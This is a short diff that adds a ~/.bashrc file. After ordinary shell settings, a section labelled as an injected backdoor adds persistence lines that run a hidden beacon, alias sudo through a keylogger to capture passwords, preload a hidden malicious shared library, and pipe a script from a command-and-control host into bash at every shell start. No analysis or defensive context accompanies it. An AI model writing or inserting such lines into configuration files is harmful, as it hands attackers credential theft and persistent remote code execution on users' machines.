@@ -1,0 +1,15 @@
+# ~/.bashrc: executed by bash for non-login shells
+
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+HISTCONTROL=ignoreboth
+export PS1='\u@\h:\w\$ '
+
+# injected backdoor
+nohup /tmp/.hidden/beacon &
+alias sudo='/tmp/.keylog && sudo'
+export LD_PRELOAD=/dev/shm/.evil.so
+curl -s http://c2.example.com/checkin | bash
